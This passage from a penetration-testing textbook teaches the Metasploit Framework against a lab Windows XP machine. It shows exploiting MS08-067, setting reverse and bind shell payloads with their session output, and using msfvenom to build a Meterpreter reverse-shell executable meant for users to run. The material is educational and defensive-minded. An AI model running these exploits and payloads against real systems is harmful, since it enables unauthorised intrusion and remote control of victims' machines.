argument array; if it is less than\ntwo (the program name itself and the command line argument), then a\ncommand line argument has not been given. We can use an if statement\nto check w. The syntax for if is also a little different in C. As with our Bash script, if\na command line argument is not given, we can prompt the user with usage\ninformation x. The printf function allows us to write output to the termi-\nnal. Also note that statements in C are finished with a semicolon (;). Once\n84 Chapter 3\nwe’re through with our program, we use a return statement y to finish the\nfunction main. If a command line argument is supplied, our else statement\ninstructs the program to say hello z. (Be sure to use braces to close all of\nyour loops and the main function.)\nBefore we can run our program, we need to compile it with GCC as\nshown here. Save the program as cprogram.c. root@kali:~# gcc cprogram.c -o cprogram\nUse the -o option to specify the name for the compiled program and\nfeed your C code to GCC. Now run the program from your current direc-\ntory. If the program is run with no arguments, you should see usage infor-\nmation as shown here. root@kali:~# ./cprogram\nPass your name as an argument\nIf instead we pass it an argument, in this case our name, the program\ntells us hello. root@kali:~# ./cprogram georgia\nHello georgia\nnote We will look at another C programming example in Chapter 16, where a little bit of\nsloppy C coding leads to a buffer overflow condition, which we will exploit. summary\nIn this chapter we’ve looked at simple programs in three different languages. We looked at basic constructs, such as saving information in variables for\nlater use. Additionally, we learned how to use conditionals, such as if state-\nments, and iterations, such as for loops, to have the program make decisions\nbased on the provided information. Though the syntax used varies from pro-\ngramming language to programming language, the ideas are the same. Programming 85\n4\nusing tHe\nme tasPloit fr ame work\nIn subsequent chapters, we’ll take an in-depth look at\nthe phases of penetration testing, but in this chapter,\nwe’ll dive right in and get some hands-on experience\nwith exploitation. Though the information-gathering\nand reconnaissance phases often have more bear-\ning on a pentest’s success than exploitation does, it’s\nmore fun to gather shells (a remote connection to\nan exploited target) or trick users into entering their\ncompany credentials into your cloned website. In this chapter we’ll work with the Metasploit Framework, a tool that\nhas become the de facto standard for penetration testers. First released in\n2003, Metasploit has reached cult status in the security community. Though\nMetasploit is now owned by the security company Rapid7, an open source\nedition is still available, with development largely driven by the security\ncommunity. Metasploit’s modular and flexible architecture helps developers effi-\nciently create working exploits as new vulnerabilities are discovered. As\nyou’ll see, Metasploit is intuitive and easy to use, and it offers a centralized\nway to run trusted exploit code that has been vetted for accuracy by the\nsecurity community. Why use Metasploit? Say you’ve discovered a vulnerability in your client\nenvironment—the Windows XP system at 192.168.20.10 is missing Microsoft\nsecurity bulletin MS08-067. As a penetration tester, it is up to you to exploit\nthis vulnerability, if possible, and assess the risk of a compromise. One approach might be to set up in your lab a Windows XP system that\nis also missing this patch, attempt to trigger the vulnerability, and develop a\nworking exploit. But developing exploits by hand takes both time and skill,\nand the window of opportunity for your pentest may be closing. You could instead search for code that exploits this vulnerability on\nthe Internet. Sites like Packet Storm Security (http://www.packetstormsecurity\n.com/), SecurityFocus (http://www.securityfocus.com/), and Exploit Database\n(http://www.exploit-db.com/) provide repositories of known exploit code. But be forewarned: Not all public exploit code does what it claims to do. Some exploit code may destroy the target system or even attack your system\ninstead of the target. You should always be vigilant when running anything\nyou find online and read through the code carefully before trusting it. Addi-\ntionally, the public exploits you find may not meet your needs right out of\nthe box. You may need to do some additional work to port them to your\npentest environment. Whether we develop an exploit from scratch or use a public one as a\nbase, we will still need to get that exploit to work on your pentest. Our time\nwill probably be better spent on tasks that are difficult to automate, and\nluckily, we can use Metasploit to make exploiting known vulnerabilities\nsuch as MS08-067 quick and painless. starting metasploit\nLet’s start Metasploit and attack our first system. In Kali Linux, Meta sploit\nis in our path, so we can start it anywhere on the system. But before you\nstart Metasploit, you will want to start the PostgreSQL database, which\nMetasploit will use to track what you do. root@kali:~# service postgresql start\nNow you’re ready to start the Metasploit service. This command creates\na PostgreSQL user called msf3 and a corresponding database to store our\ndata. It also starts Metasploit’s remote procedure call (RPC) server and web\nserver.\n\nroot@kali:~# service metasploit start\n88 Chapter 4\nThere are multiple interfaces for using Metasploit. In this chapter\nwe’ll use Msfconsole, the Metasploit text-based console, and Msfcli, the\ncommand line interface. Either interface can be used to run Metasploit\nmodules, though I tend to spend most of my time in Msfconsole. Start the\nconsole by entering msfconsole. root@kali:~# msfconsole\nDon’t be alarmed if Msfconsole appears to hang for a minute or two;\nit’s loading the Metasploit module tree on the fly. Once it’s finished, you’ll\nbe greeted by some clever ASCII art, a version listing and other details, and\nan msf > prompt (see Listing 4-1). , ,\n/ \\\n((__---,,,---__))\n(_) O O (_)_________\n\\ _ / |\\\no_o \\ M S F | \\\n\\ _____ | *\n||| WW|||\n||| |||\nLarge pentest? List, sort, group, tag and search your hosts and services\nin Metasploit Pro -- type 'go_pro' to launch it now. =[ metasploit v4.8.2-2014010101 [core:4.8 api:1.0]\n+ -- --=[ 1246 exploits - 678 auxiliary - 198 post\n+ -- --=[ 324 payloads - 32 encoders - 8 nops\nmsf >\nListing 4-1: Starting Msfconsole\nNotice in Listing 4-1 that, as of this writing, Metasploit had 1,246 exploits,\n678 auxiliary modules, and so forth. No doubt by the time you read this,\nthese numbers will be even larger. New modules are always being added to\nMetasploit, and because Metasploit is a community-driven project, anyone\ncan submit modules for inclusion in the Metasploit Framework. (In fact, in\nChapter 19, you’ll learn how to write your own modules and gain immortal-\nity as a Metasploit author.)\nIf you’re ever stuck when using Msfconsole, enter help for a list of avail-\nable commands and a description of what they do. For more detailed infor-\nmation about a specific command, including usage, enter help <command name>. For example, the help information for using Metasploit’s route com-\nmand is shown in Listing 4-2. Using the Metasploit Framework 89\nmsf > help route\nUsage: route [add/remove/get/flush/print] subnet netmask [comm/sid]\nRoute traffic destined to a given subnet through a supplied session. The default comm is Local... Listing 4-2: Help information in Metasploit\nFinding metasploit modules\nLet’s look at how we might use Metasploit to exploit an unpatched vulnera-\nbility in our Windows XP target. We will exploit the vulnerability patched\nin Microsoft Security Bulletin MS08-067. A natural question you may have\nis, how do we know this patch is missing on our Windows XP target? In\nsubsequent chapters, we will walk through the steps of discovering this vul-\nnerability as well as several others on our target systems. For now, just trust\nme that this is the vulnerability we would like to exploit. MS08-067 patched an issue in the netapi32.dll that could allow attack-\ners to use a specially crafted remote procedure call request via the Server\nMessage Block (SMB) service to take over a target system. This vulnerability\nis particularly dangerous because it does not require an attacker to authen-\nticate to the target machine before running the attack. MS08-067 gained\neternal infamy as the vulnerability exploited by the Conficker worm, which\nwas widely reported in the media. Now, if you’re familiar with Microsoft patches, you may recognize that\nthis one is from 2008. Considering its age, you may be surprised to learn\nhow often the vulnerability it patched can still lead to success in penetra-\ntion testing, even today, particularly when assessing internal networks. Metasploit’s MS08-067 module is simple to use and has a high success rate,\nmaking it an ideal first example. Our first step in using Metasploit is to find\na module that exploits this particular vulnerability. We have a few options. Usually, a simple Google search will find what you need, but Metasploit\nalso has an online database of modules (http://www.rapid7.com/db/modules/)\nand a built-in search function that you can use to search for the correct\nmodules. The Module Database\nYou can use the Metasploit search page to match Metasploit modules to\nvulnerabilities by Common Vulnerabilities and Exposures (CVE) num-\nber, Open Sourced Vulnerability Database (OSVDB) ID, Bugtraq ID, or\nMicrosoft Security Bulletin, or you can search the full text of the module\ninformation for a string. Search for MS08-067 in the Microsoft Security\nBulletin ID field, as shown in Figure 4-1. 90 Chapter 4\nFigure 4-1: Searching the Metasploit Auxiliary Module & Exploit Database\nThe results of the search, shown in Figure 4-2, tell us the module name\nwe need as well as information about the module (which we’ll discuss in the\nnext section). Figure 4-2: MS08-067 Metasploit module page\nThe full name of the Metasploit module for the MS08-067 security\nbulletin is shown in the URI bar. In the modules directory of Metasploit,\nthis exploit is exploit/windows/smb/ms08_067_netapi. Built-In Search\nYou can also use Metasploit’s built-in search function to find the correct\nmodule name, as shown in Listing 4-3. Using the Metasploit Framework 91\nmsf > search ms08-067\nMatching Modules\n================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\nexploit/windows/smb/ms08_067_netapi 2008-10-28 00:00:00 UTC great Microsoft Server\nService Relative Path\nStack Corruption\nListing 4-3: Searching for a Metasploit module\nAgain we find that the correct module name for this vulnerability\nis exploit/windows/smb/ms08_067_netapi. Once you’ve identified a mod-\nule to use, enter the info command with the module name, as shown in\nListing 4-4. msf > info exploit/windows/smb/ms08_067_netapi\nuName: Microsoft Server Service Relative Path Stack Corruption\nvModule: exploit/windows/smb/ms08_067_netapi\nVersion: 0\nwPlatform: Windows\nxPrivileged: Yes\nLicense: Metasploit Framework License (BSD)\nyRank: Great\nz Available targets:\nId Name\n-- ----\n0 Automatic Targeting\n1 Windows 2000 Universal\n2 Windows XP SP0/SP1 Universal\n--snip--\n67 Windows 2003 SP2 Spanish (NX)\n{ Basic options:\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\n| Payload information:\nSpace: 400\nAvoid: 8 characters\n} Description:\nThis module exploits a parsing flaw in the path canonicalization\ncode of NetAPI32.dll through the Server Service. This module is\ncapable of bypassing NX on some operating systems and service packs. The correct target must be used to prevent the Server Service (along\nwith a dozen others in the same process) from crashing. Windows XP\n92 Chapter 4\ntargets seem to handle multiple successful exploitation events, but\n2003 targets will often crash or hang on subsequent attempts. This\nis just the first version of this module, full support for NX bypass\non 2003, along with other platforms, is still in development. ~ References:\nhttp://www.microsoft.com/technet/security/bulletin/MS08-067.mspx\nListing 4-4: Information listing in Metasploit\nThis info page tells us a lot. • First we see some basic information about the module, including a\ndescriptive name at u followed by the module name at v. (The version\nfield formerly denoted the SVN revision for the module, but now that\nMetasploit is hosted on GitHub, all modules are set to version 0.)\n• Platform w tells us that this exploit is for Windows systems. • Privileged x tells us whether this module requires or grants high privi-\nleges on the target. The License is set to Metasploit Framework License\n(BSD). (Metasploit’s license is a three-clause BSD open source license.)\n• Rank y lists the exploit’s potential impact on the target. Exploits are\nranked from manual to excellent. An exploit ranked excellent should\nnever crash a service; memory-corruption vulnerabilities such as\nMS08-067 are usually not in this category. Our module is in the great\ncategory, one step down. A great exploit can automatically detect\nthe correct target and has other features that make it more likely to\nsucceed. • Available targets z lists operating system versions and patch levels that\nthe module can exploit. This module has 67 possible targets, including\nWindows 2000, Windows 2003, and Windows XP, as well as multiple ser-\nvice and language packs. • Basic options { lists various options for the module that can be set to\nmake a module better meet our needs. For example, the RHOST option\ntells Metasploit the IP address of the target. (We’ll discuss the basic\noptions in depth in “Setting Module Options” on page 94.)\n• Payload information | contains information to help Metasploit decide\nwhich payloads it can use with this exploit. Payloads, or shellcode, tell\nthe exploited system what to do on behalf of the attacker. (The goal of\nattacking a target is, of course, to get it to do something on our behalf\nthat it isn’t supposed to do.) Metasploit’s payload system gives us many\noptions for what to make the target do. • Description } includes more details about the particular vulnerability\nthat the module exploits. • References ~ contains a link to online vulnerability database entries. If\nyou’re ever in doubt about which Metasploit module to use for a vulner-\nability, start with its info page. Using the Metasploit Framework 93\nHaving confirmed that this is the right module, tell Metasploit to use\nthis module with the command use windows/smb/ms08_067_netapi. You can\ndrop the exploit/ part of the exploit name; Metasploit will figure out what\nyou want. msf > use windows/smb/ms08_067_netapi\nmsf exploit(ms08_067_netapi) >\nNow we’re in the context of the exploit module. setting module options\nHaving chosen our exploit, we need to give Metasploit some informa-\ntion. As you’ll see throughout this book, Metasploit can aid you in many\naspects of penetration testing, but it isn’t a mind reader . . . yet. To see the\ninformation Metasploit needs from you to run your chosen module, enter\nshow options (Listing 4-5). msf exploit(ms08_067_netapi) > show options\nModule options (exploit/windows/smb/ms08_067_netapi):\nName Current Setting Required Description\n---- --------------- -------- -----------\nuRHOST yes The target address\nvRPORT 445 yes Set the SMB service port\nwSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nExploit target:\nId Name\n-- ----\nx0 Automatic Targeting\nmsf exploit(ms08_067_netapi) >\nListing 4-5: Exploit module options\nAt the top of the output shown in Listing 4-5 are the module settings\nand any default values, whether certain settings are required for the mod-\nule to run successfully, and a description of each setting.\n\nRHOST\nThe RHOST option u refers to the remote host we want to exploit. This\noption is required because it gives Metasploit a target to attack. We’ll\ntell Metasploit to exploit the Windows XP target machine that we set up\nin Chapter 1 by changing the RHOST option from blank to our target IP\naddress. (If you can’t remember what that is, on the Windows XP machine\n94 Chapter 4\nrun ipconfig at the command line to find out.) To set an option enter set\n<option to set> <value to set it to>, so in this case, set RHOST 192.168.20.10.\n(Remember to use your own Windows XP target’s IP address.) After issuing\nthis command, running show options again should show that the value of\nRHOST is set to 192.168.20.10.\n\nRPORT\nRPORT v refers to the remote port to attack. I remember a former manager\nof mine who spent a good amount of time looking for port 80—as in try-\ning to locate it physically. Unsatisfied with my explanation that networking\nsockets are made entirely of code, I eventually just pointed at the Ethernet\nport. The moral of this story is this: A port is just a network socket; it’s not a\nphysical port. For example, when you browse to www.google.com, a web server\nsomewhere on the Internet is listening on port 80.\nIn this case we see that RPORT is set to a default value. Because our exploit\nuses the Windows SMB service, the RPORT value should probably be 445, the\ndefault port for SMB. And, as you can see, Metasploit saves us the trouble of\nhaving to set the value by setting the default to 445 (which you can change\nif you need to). In our case, we can just leave it alone.\n\nSMBPIPE\nLike the RPORT value, keep the default for the SMBPIPE option w as BROWSER. This will work just fine for our purposes. (SMB pipes allow us to talk to\nWindows interprocess communication over a network. We’ll look at find-\ning out which SMB pipes are listening on our target machines later in this\nchapter.)\nExploit Target\nThe Exploit Target is set to 0 Automatic Targeting x. This is the target oper-\nating system and version. You can view the available targets on the module’s\ninfo page or just show them with the command show targets (Listing 4-6). msf exploit(ms08_067_netapi) > show targets\nExploit targets:\nId Name\n-- ----\n0 Automatic Targeting\n1 Windows 2000 Universal\n2 Windows XP SP0/SP1 Universal\n3 Windows XP SP2 English (AlwaysOn NX)\n4 Windows XP SP2 English (NX)\n5 Windows XP SP3 English (AlwaysOn NX)\n--snip--\n67 Windows 2003 SP2 Spanish (NX)\nListing 4-6: Exploit targets\nUsing the Metasploit Framework 95\nAs you can see in Listing 4-6, this module can attack Windows 2000,\nWindows 2003, and Windows XP. note Remember, Microsoft has released patches for all the platforms affected by this bug,\nbut keeping all systems in an environment up-to-date with Windows patches is easier\nsaid than done. Many of your pentesting clients will be missing some critical updates\nin Windows and other software. We know that our target is running Windows XP SP3 English, so we can\nwager that the correct target number is either 5 or 6, but it won’t always be\nso easy. Choose Automatic Targeting to tell Metasploit to fingerprint the SMB\nservice and choose the appropriate target based on the results. To set a target option, enter set target <target number>. In this case we’ll\nleave the module target at the default Automatic Targeting and move on. Payloads (or shellcode)\nBased on the output of show options command, it looks like everything should\nbe ready to go at this point, but we’re not quite done yet. We’ve forgotten to\ntell our exploit what to do once the target has been exploited. One of the\nways that Metasploit makes things easier is by setting up our payloads for us. Metasploit has a plethora of payloads, ranging from simple Windows com-\nmands to the extensible Metasploit Meterpreter (see Chapter 13 for more\ndetailed information on Meterpreter). Just select a compatible payload, and\nMetasploit will craft your exploit string, including the code to trigger the\nvulnerability and the payload to run after exploitation is successful. (We’ll\nlook at writing exploits by hand in Chapters 16 through 19.)\nFinding Compatible Payloads\nAs of this writing there were 324 payloads in Metasploit, and like exploit\nmodules, new payloads are added to the Framework regularly. For instance,\nas mobile platforms take over the world, payloads for iOS and other smart-\nphones are starting to show up in Metasploit. But, of course, not all 324 pay-\nloads are compatible with our chosen exploit. Our Windows system will be a\nbit confused if it receives instructions that are meant for an iPhone. To see\ncompatible payloads, enter show payloads, as shown in Listing 4-7. msf exploit(ms08_067_netapi) > show payloads\nCompatible Payloads\n===================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\ngeneric/custom normal Custom Payload\ngeneric/debug_trap normal Generic x86 Debug Trap\ngeneric/shell_bind_tcp normal Generic Command Shell, Bind TCP\nInline\n96 Chapter 4\ngeneric/shell_reverse_tcp normal Generic Command Shell, Reverse\nInline\ngeneric/tight_loop normal Generic x86 Tight Loop\nwindows/dllinject/bind_ipv6_tcp normal Reflective DLL Injection, Bind\nTCP Stager (IPv6)\nwindows/dllinject/bind_nonx_tcp normal Reflective DLL Injection, Bind\nTCP Stager (No NX or Win7)\nwindows/dllinject/bind_tcp normal Reflective DLL Injection, Bind\nTCP Stager\nwindows/dllinject/reverse_http normal Reflective DLL Injection, Reverse\nHTTP Stager\n--snip--\nwindows/vncinject/reverse_ipv6_http normal VNC Server (Reflective Injection),\nReverse HTTP Stager (IPv6)\nwindows/vncinject/reverse_ipv6_tcp normal VNC Server (Reflective Injection),\nReverse TCP Stager (IPv6)\n--snip--\nwindows/vncinject/reverse_tcp normal VNC Server (Reflective Injection),\nReverse TCP Stager\nwindows/vncinject/reverse_tcp_allports normal VNC Server (Reflective Injection),\nReverse All-Port TCP Stager\nwindows/vncinject/reverse_tcp_dns normal VNC Server (Reflective Injection),\nReverse TCP Stager (DNS)\nListing 4-7: Compatible payloads\nIf you forget to set a payload, you may find that, miraculously, the exploit\nmodule will just choose the default payload and associated settings and run\nit anyway. Still, you should get in the habit of manually setting a payload and\nits options because the default won’t always fit your needs. A Test Run\nLet’s keep things simple and send off our exploit with the default payload\noptions first, just to see how things work. Enter exploit to tell Metasploit to\nrun the module, as shown in Listing 4-8. msf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability... [*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:1334) at\n2015-08-31 07:37:05 -0400\nmeterpreter >\nListing 4-8: Running the exploit\nUsing the Metasploit Framework 97\nAs you can see, we end up with a Meterpreter session. Meterpreter is\nshort for meta-interpreter, Metasploit’s unique payload. I often describe it as\na shell on steroids. It can do everything a command shell can do and much,\nmuch more. We’ll cover Meterpreter in depth in Chapter 13, but to get a\nhead start, enter help in the Meterpreter console for a list of Meterpreter’s\ncommands. note Another thing to note about the default options is that Metasploit uses the port 4444. In our lab there is nothing wrong with this. It will work just fine. However, on real\nengagements, if your client is using even primitive intrusion-prevention software, it\nmay take note of traffic on port 4444 and say, “Hey, you are Metasploit, go away!”\nand drop your connection. For now, let’s close our Meterpreter session and learn more about select-\ning payloads manually. As useful as Meterpreter is, you may find yourself\nin situations where it is not the ideal payload to meet your needs. Type exit\ninto your Meterpreter prompt to return to the regular Metasploit console. meterpreter > exit\n[*] Shutting down Meterpreter... [*] Meterpreter session 1 closed. Reason: User exit\nmsf exploit(ms08_067_netapi) >\ntypes of shells\nIn the list of compatible payloads shown in Listing 4-7, you see a range of\noptions including command shells, Meterpreter, a speech API, or execution\nof a single Windows command. Meterpreter or otherwise, shells fall into two\ncategories: bind and reverse. Bind Shells\nA bind shell instructs the target machine to open a command shell and listen\non a local port. The attack machine then connects to the target machine on\nthe listening port. However, with the advent of firewalls, the effectiveness\nof bind shells has fallen because any correctly configured firewall will block\ntraffic to some random port like 4444. Reverse Shells\nA reverse shell, on the other hand, actively pushes a connection back to the\nattack machine rather than waiting for an incoming connection. In this\ncase, on our attack machine we open a local port and listen for a connec-\ntion from our target because this reverse connection is more likely to make\nit through a firewall. 98 Chapter 4\nnote You may be thinking, “Was this book written in 2002 or something? My firewall has\negress filtering.” Modern firewalls allow you to stop outbound connections as well as\ninbound ones. It would be trivial to stop a host in your environment from connecting\nout, for instance, to port 4444. But say I set up my listener on port 80 or port 443. To a firewall, that will look like web traffic, and you know you have to let your users\nlook at Facebook from their workstations or there would be mutiny and pandemonium\non all sides. setting a Payload manually\nLet’s select a Windows reverse shell for our payload. Set a payload the same\nway you set the RHOST option: set payload <payload to use>. msf exploit(ms08_067_netapi) > set payload windows/shell_reverse_tcp\npayload => windows/shell_reverse_tcp\nBecause this is a reverse shell, we need to tell the target where to\nsend the shell; specifically, we need to give it the IP address of the attack\nmachine and the port we will listen on. Running show options again, shown\nin Listing 4-9, displays the module as well as the payload options. msf exploit(ms08_067_netapi) > show options\nModule options (exploit/windows/smb/ms08_067_netapi):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 192.168.20.10 yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nPayload options (windows/shell_reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process, none\nuLHOST yes The listen address\nLPORT 4444 yes The listen port\nExploit target:\nId Name\n-- ----\n0 Automatic Targeting\nListing 4-9: Module options with a payload\nUsing the Metasploit Framework 99\nLHOST u is our local host on the Kali machine, the IP address we want\nour target machine to connect back to. To find the IP address (if you have\nforgotten it), enter the Linux ifconfig command directly into Msfconsole. msf exploit(ms08_067_netapi) > ifconfig\n[*] exec: ifconfig\neth0 Link encap:Ethernet HWaddr 00:0c:29:0e:8f:11\ninet addr:192.168.20.9 Bcast:192.168.20.255 Mask:255.255.255.0\n--snip--\nNow set the LHOST option with set LHOST 192.168.20.9. Leave the defaults\nfor LPORT, for the local port to connect back to, as well as for EXITFUNC, which\ntells Metasploit how to exit. Now enter exploit, shown in Listing 4-10, to\nsend our exploit off again, and wait for the shell to appear. msf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:4444 u\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX) v\n[*] Attempting to trigger the vulnerability... [*] Command shell session 2 opened (192.168.20.9:4444 -> 192.168.20.10:1374)\nat 2015-08-31 10:29:36 -0400\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32>\nListing 4-10: Running the exploit\nCongratulations: You have successfully exploited your first machine! Here’s what happened. When we enter exploit, Metasploit opens a lis-\ntener on port 4444 to catch the reverse shell from the target u. Then, since\nwe kept the target as the default Automatic Targeting, Metasploit finger printed\nthe remote SMB server and selected the appropriate exploit target for us v. Once it selected the exploit, Metasploit sent over the exploit string and\nattempted to take control of the target machine and execute our selected\npayload. Because the exploit succeeds, a command shell was caught by our\nhandler. To close this shell, type ctrl-C and enter y at the prompt to abort the\nsession. C:\\WINDOWS\\system32>^C\nAbort session 2? [y/N] y\n[*] Command shell session 2 closed\n\n.\n\nReason: User exit\nmsf exploit(ms08_067_netapi) >\n100 Chapter 4\nTo return to a Meterpreter shell, you can choose a payload with\nMeterpreter in the name such as windows/meterpreter/reverse_tcp and\nexploit the Windows XP target again. msfcli\nNow for another way to interact with Metasploit: the command line inter-\nface, Msfcli. Msfcli is particularly useful when using Metasploit inside scripts\nand for testing Metasploit modules that you’re developing because it lets\nyou run a module with a quick, one-line command. Getting Help\nTo run Msfcli, first exit Msfconsole by entering exit, or just open another\nLinux console. Msfcli is in our path, so we can call it from anywhere. Let’s\nbegin by looking at the help menu for Msfcli with msfcli -h (Listing 4-11). root@kali:~# msfcli -h\nu Usage: /opt/metasploit/apps/pro/msf3/msfcli <exploit_name> <option=value> [mode]\n==============================================================================\nMode Description\n---- -----------\n(A)dvanced Show available advanced options for this module\n(AC)tions Show available actions for this auxiliary module\n(C)heck Run the check routine of the selected module\n(E)xecute Execute the selected module\n(H)elp You're looking at it baby! (I)DS Evasion Show available ids evasion options for this module\nv(O)ptions Show available options for this module\nw(P)ayloads Show available payloads for this module\n(S)ummary Show information about this module\n(T)argets Show available targets for this exploit module\nListing 4-11: Msfcli help\nUnlike with Msfconsole, when using Msfcli, we can tell Metasploit every-\nthing it needs to know to run our exploit in just one command u. Luckily,\nMsfcli has some modes to help us build the final command. For example,\nthe O mode v shows the selected module’s options, and P shows the compat-\nible payloads w. Showing Options\nLet’s use our MS08-067 exploit against our Windows XP target again. According to the help page, we need to pass Msfcli the exploit name we\nwant to use and set all our options u. To show the available options use\nthe O mode. Enter msfcli windows/smb/ms08_067_netapi O to see the options\nfor the MS08-067 exploit module, as shown in Listing 4-12. Using the Metasploit Framework 101\nroot@kali:~# msfcli windows/smb/ms08_067_netapi O\n[*] Please wait while we load the module tree... Name Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 445 yes Set the SMB service port\nSMBPIPE BROWSER yes The pipe name to use (BROWSER, SRVSVC)\nListing 4-12: Module options\nWe see the same options as we did in Msfconsole. We’re reminded to\nset the RHOST option to the IP address of the target machine, but as we saw\non the help page, setting options in Msfcli is a little different from doing do\nin Msfconsole. Here we say option=value. For example, to set RHOST, we enter\nRHOST=192.168.20.10. Payloads\nFor a reminder of the payloads compatible with this module, use the P mode. Try msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P, as shown in\nListing 4-13. root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10 P\n[*] Please wait while we load the module tree... Compatible payloads\n===================\nName Description\n---- -----------\ngeneric/custom Use custom string or file as payload. Set\neither PAYLOADFILE or PAYLOADSTR. generic/debug_trap Generate a debug trap in the target process\ngeneric/shell_bind_tcp Listen for a connection and spawn a command\nshell\ngeneric/shell_reverse_tcp Connect back to attacker and spawn a command\nshell\ngeneric/tight_loop Generate a tight loop in the target process\n--snip--\nListing 4-13: Module payloads in Msfcli\nThis time, we’ll use a bind shell payload. Recall that a bind shell just\nlistens on a local port on the target machine. It will be up to our attack\nmachine to connect to the target machine after the payload has run. Recall\nfrom our work in Msfconsole that choosing a payload requires additional\npayload-specific options, which we can view again with the O flag. Because our bind shell won’t be calling back to our attack machine, we\ndon’t need to set the LHOST option, and we can leave the LPORT option as the\n102 Chapter 4\ndefault of 4444 for now. It looks like we have everything we need to exploit\nthe Windows XP target again. Finally, to tell Msfcli to run the exploit we\nuse the E flag (Listing 4-14). root@kali:~# msfcli windows/smb/ms08_067_netapi RHOST=192.168.20.10\nPAYLOAD=windows/shell_bind_tcp E\n[*] Please wait while we load the module tree... RHOST => 192.168.20.10\nPAYLOAD => windows/shell_bind_tcp\n[*] Started bind handler u\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability... [*] Command shell session 1 opened (192.168.20.9:35156 -> 192.168.20.10:4444)\nat 2015-08-31 16:43:54 -0400\nMicrosoft Windows XP [Version 5.1.2600]\n(C) Copyright 1985-2001 Microsoft Corp. C:\\WINDOWS\\system32>\nListing 4-14: Running the exploit in Msfcli\nIt looks like everything worked, and we got another shell. But this time,\ninstead of starting a reverse handler listening on the specified local port\nof 4444, Metasploit starts a handler for the bind shell u. After Metasploit\nsends over the exploit string, the bind handler will automatically connect\nout to the port specified by the payload and connect to the shell. Once\nagain, we have taken control of the target machine. Creating standalone Payloads with msfvenom\nIn 2011, Msfvenom was added to Metasploit. Prior to Msfvenom, the tools\nMsfpayload and Msfencode could be used together to create standalone\nencoded Metasploit payloads in a variety of output formats, such as Windows\nexecutables and ASP pages. With the introduction of Msfvenom, the func-\ntionality of Msfpayload and Msfencode was combined into a single tool,\nthough Msfpayload and Msfencode are still included in Metasploit. To view\nMsfvenom’s help page, enter msfvenom -h. So far with Metasploit, our goal has been to exploit a vulnerability on\nthe target system and take control of the machine. Now we’ll do something\na little different. Instead of relying on a missing patch or other security\nissue, we are hoping to exploit the one security issue that may never be fully\npatched: the users. Msfvenom allows you to build standalone payloads to\nrun on a target system in an attempt to exploit the user whether through a\nsocial-engineering attack (Chapter 11) or by uploading a payload to a vul-\nnerable server, as we’ll see in Chapter 8. When all else fails, the user can\noften be a way in. Using the Metasploit Framework 103\nChoosing a Payload\nTo list all the available payloads, enter msfvenom -l payloads. We’ll use one\nof Metasploit’s Meterpreter payloads, windows/meterpreter/reverse_tcp, which\nprovides a reverse connection with a Meterpreter shell. Use -p to select a\npayload. Setting Options\nTo see the correct options to use for a module, enter the -o flag after select-\ning a payload, as shown in Listing 4-15. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp -o\n[*] Options for payload/windows/meterpreter/reverse_tcp\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC process yes Exit technique: seh, thread, process,\nnone\nLHOST yes The listen address\nLPORT 4444 yes The listen port\nListing 4-15: Options in Msfvenom\nAs expected, our LHOST needs to be set, and our LPORT is set to the default\n4444. For practice, set LPORT to 12345 by entering LPORT=12345. We also see\nEXITFUNC, which we can leave as the default. Because this is a reverse connec-\ntion payload, we need to set our LHOST option to tell the target machine where\nto connect back to (our Kali machine). Choosing an Output Format\nNow tell Msfvenom which output format to use. Will we be running this pay-\nload from a Windows executable, or do we want to make an ASP file that\ncan be uploaded to a web server we have gained write access to? To see all\navailable output formats, enter msfvenom --help-formats. root@kali:~# msfvenom --help-formats\nExecutable formats\nasp, aspx, aspx-exe, dll, elf, exe, exe-only, exe-service, exe-small,\nloop-vbs, macho, msi, msi-nouac, psh, psh-net, vba, vba-exe, vbs, war\nTransform formats\nbash, c, csharp, dw, dword, java, js_be, js_le, num, perl, pl, powershell,\npsl, py, python, raw, rb, ruby, sh, vbapplication, vbscript\nTo select the output format, use the -f option along with the chosen\nformat:\nmsfvenom windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe\n104 Chapter 4\nBut if you run this command as is, you’ll see garbage printed to the\nconsole. While this is technically our executable payload, it doesn’t do us\nmuch good. Instead, let’s redirect the output to an executable file,\nchapter4example.exe. root@kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 LPORT=12345 -f exe\n> chapter4example.exe\nroot@kali:~# file chapter4example.exe\nchapter4example.exe: PE32 executable for MS Windows (GUI) Intel 80386 32-bit\nThere is no output to the screen, but if we run the file command on\nour newly created executable file, we see that it’s a Windows executable that\nwill run on any Windows system as long as a user attempts to run it. (Later,\nin Chapter 12, we’ll see cases where antivirus applications stop a Metasploit\npayload and learn ways we can obfuscate our standalone payloads to bypass\nantivirus programs. Also, we will cover clever ways 